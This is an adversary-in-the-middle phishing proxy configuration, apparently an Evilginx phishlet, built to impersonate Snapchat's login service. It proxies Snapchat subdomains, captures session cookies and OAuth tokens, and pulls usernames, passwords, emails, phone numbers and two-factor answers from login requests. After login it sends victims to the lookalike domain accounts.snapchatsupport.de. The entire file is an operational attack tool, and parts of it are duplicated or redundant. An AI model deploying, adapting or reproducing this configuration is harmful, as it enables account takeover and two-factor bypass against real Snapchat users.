author: '@Lenasnap'
min_ver: '3.0.0'

#﴾⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗🅇🅅🄴🅁🄶🄸🄽🄸🄰⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗﴿
proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'ads', orig_sub: 'ads', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'snapchat.com', session: false, is_landing: false}
  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false}
  - {phish_sub: 'snapkit', orig_sub: 'accounts', domain: 'snapkit.snapchat.com', session: true, is_landing: false}

  # Snapchat Accounts (main login/registration)
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
  
  # Other Snapchat subdomains
  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'ads', orig_sub: 'ads', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'snapchat.com', session: true, is_landing: false}

  # Static assets (JS, CSS, images) - usually doesn't require session persistence
  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'snapchat.com', session: false, is_landing: false}
  
  # Google App Engine's csp-central for Snapchat's security policies
  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false}
  
  # Snapchat's SnapKit (if used for third-party logins)
  - {phish_sub: 'snapkit', orig_sub: 'accounts', domain: 'snapkit.snapchat.com', session: true, is_landing: false}

#﴾⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗🅇🅅🄴🅁🄶🄸🄽🄸🄰⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗﴿
sub_filters:
# For accounts.snapchat.com
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

# For www.snapchat.com
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

# For csp-central.appspot.com
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

# Additional Potential Subdomains and Edge Cases
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapkit.snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapkit.snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapkit.snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

- {triggers_on: 'accounts.snapchat.com', orig_sub: 'auth', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'auth', domain: 'snapchat.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'auth', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'auth', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'accounts.snapchat.com', orig_sub: 'auth', domain: 'snapchat.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}


# For ads.snapchat.com (in case Snapchat uses a different domain for ads or related services)
- {triggers_on: 'ads.snapchat.com', orig_sub: 'ads', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'ads.snapchat.com', orig_sub: 'ads', domain: 'snapchat.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'ads.snapchat.com', orig_sub: 'ads', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'ads.snapchat.com', orig_sub: 'ads', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'ads.snapchat.com', orig_sub: 'ads', domain: 'snapchat.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

# For api.snapchat.com (if Snapchat exposes APIs via a dedicated subdomain)
- {triggers_on: 'api.snapchat.com', orig_sub: 'api', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'application/javascript']}
- {triggers_on: 'api.snapchat.com', orig_sub: 'api', domain: 'snapchat.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['application/json', 'application/javascript']}
- {triggers_on: 'api.snapchat.com', orig_sub: 'api', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json', 'application/javascript']}
- {triggers_on: 'api.snapchat.com', orig_sub: 'api', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/json', 'application/javascript']}
- {triggers_on: 'api.snapchat.com', orig_sub: 'api', domain: 'snapchat.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['application/json', 'application/javascript']}

# Potential mobile-specific subdomains (e.g., m.snapchat.com)
- {triggers_on: 'm.snapchat.com', orig_sub: 'm', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'm.snapchat.com', orig_sub: 'm', domain: 'snapchat.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'm.snapchat.com', orig_sub: 'm', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'm.snapchat.com', orig_sub: 'm', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
- {triggers_on: 'm.snapchat.com', orig_sub: 'm', domain: 'snapchat.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

# For potential static assets (CSS/JS/images hosted on a CDN)
- {triggers_on: 'assets.snapchat.com', orig_sub: 'assets', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/css', 'application/javascript', 'image/jpeg', 'image/png']}
- {triggers_on: 'assets.snapchat.com', orig_sub: 'assets', domain: 'snapchat.com', search: 'http://{hostname}', replace: 'http://{hostname}', mimes: ['text/css', 'application/javascript', 'image/jpeg', 'image/png']}
- {triggers_on: 'assets.snapchat.com', orig_sub: 'assets', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/css', 'application/javascript', 'image/jpeg', 'image/png']}
- {triggers_on: 'assets.snapchat.com', orig_sub: 'assets', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/css', 'application/javascript', 'image/jpeg', 'image/png']}
- {triggers_on: 'assets.snapchat.com', orig_sub: 'assets', domain: 'snapchat.com', search: 'href="http://{hostname}', replace: 'href="http://{hostname}', mimes: ['text/css', 'application/javascript', 'image/jpeg', 'image/png']}

#﴾⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗🅇🅅🄴🅁🄶🄸🄽🄸🄰⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗﴿
auth_tokens:
  # Main Snapchat domain
  - domain: 'snapchat.com'
    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken', 'scs', 'sc_sid', 'secure_session_id']

  # Snapchat's OAuth and API interactions (SnapKit)
  - domain: 'snapkit.snapchat.com'
    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken', 'oauth_token', 'oauth_secret']

  # Google's App Engine for Snapchat's security and policy handling
  - domain: 'appspot.com'
    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken']

  # Static assets or other services (typically doesn't carry important tokens, but included for completeness)
  - domain: 'assets.snapchat.com'
    keys: []

  # Possible mobile subdomains or additional service domains
  - domain: 'm.snapchat.com'
    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken', 'scs', 'sc_sid', 'secure_session_id']
  - domain: 'ads.snapchat.com'
    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken']

#﴾⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗🅇🅅🄴🅁🄶🄸🄽🄸🄰⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗﴿   
auth_urls:
  - "/v2/welcome" 
  - "^/v2/welcome/$"
#﴾⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗🅇🅅🄴🅁🄶🄸🄽🄸🄰⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗﴿
credentials:
  username:
    key: "accountIdentifier"
    search: "(.*)"
    type: "post"
  password:
    key: "password"
    search: "(.*)"
    type: "post"
  custom:
    - key: "email"
      search: "email\":\"(.*?)\""
      type: "post"
    - key: 'ai_token'
      search: "(.*)"
      type: 'post'
    - key: 'twoFAChallengeAnswer'
      search: "(.*)"
      type: 'post'
    - key: 'accountIdentifierCountryCode'
      search: "(.*)"
      type: 'post'
    - key: 'accountIdentifierPhoneNumber'
      search: "(.*)"
      type: 'post'

#﴾⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗🅇🅅🄴🅁🄶🄸🄽🄸🄰⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗⟗﴿
login:
  domain: "accounts.snapchat.com"
  path: "/"
  

redirect_url: 'https://accounts.snapchatsupport.de/v2/welcome'
#redirect_url: 'https://accounts.snapchat.com/accounts/v2/login'  